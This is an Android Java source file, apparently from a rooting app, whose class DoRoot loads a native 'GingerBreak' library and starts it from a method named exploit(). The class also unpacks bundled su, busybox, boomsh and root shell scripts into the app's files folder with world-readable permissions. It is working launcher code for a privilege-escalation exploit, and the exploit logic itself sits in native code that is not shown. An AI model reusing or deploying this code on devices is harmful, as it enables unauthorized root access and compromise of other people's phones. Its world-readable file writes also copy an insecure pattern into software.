package com.intercept.root;


import java.io.FileOutputStream;
import java.io.InputStream;
import java.util.zip.GZIPInputStream;
import android.content.Context;

public class DoRoot {

	
	static {
        System.loadLibrary("GingerBreak");
	}
	public static native void runMain();

	public void saveFiles(Context ApplicationContext)
	{
		try
		{
				SaveIncludedZippedFileIntoFilesFolder(R.raw.busybox, "busybox", ApplicationContext);
				SaveIncludedZippedFileIntoFilesFolder(R.raw.install, "install.sh", ApplicationContext);
				SaveIncludedZippedFileIntoFilesFolder(R.raw.su, "su", ApplicationContext);
				SaveIncludedZippedFileIntoFilesFolder(R.raw.joeykrim_root, "joeykrim-root.sh", ApplicationContext);
				SaveIncludedZippedFileIntoFilesFolder(R.raw.playlogo, "playlogo", ApplicationContext);
				SaveIncludedZippedFileIntoFilesFolder(R.raw.boomsh, "boomsh", ApplicationContext);
		}
		catch (Exception e1) 
		{
				e1.printStackTrace();
		}
	}
	
	public void exploit()
	{
		new Thread() {
			public void run() 
			{
				runMain();
			};
		}.start();
	}
	
    // extracted gz files to files dir so we can use them
    public static void SaveIncludedZippedFileIntoFilesFolder(int resourceid, String filename, Context ApplicationContext) throws Exception {
		InputStream is = ApplicationContext.getResources().openRawResource(resourceid);
		FileOutputStream fos = ApplicationContext.openFileOutput(filename, Context.MODE_WORLD_READABLE);
		GZIPInputStream gzis = new GZIPInputStream(is);
		byte[] bytebuf = new byte[1024];
		int read;
		while ((read = gzis.read(bytebuf)) >= 0) {
			fos.write(bytebuf, 0, read);
		}
		gzis.close();
		fos.getChannel().force(true);
		fos.flush();
		fos.close();
	}
}
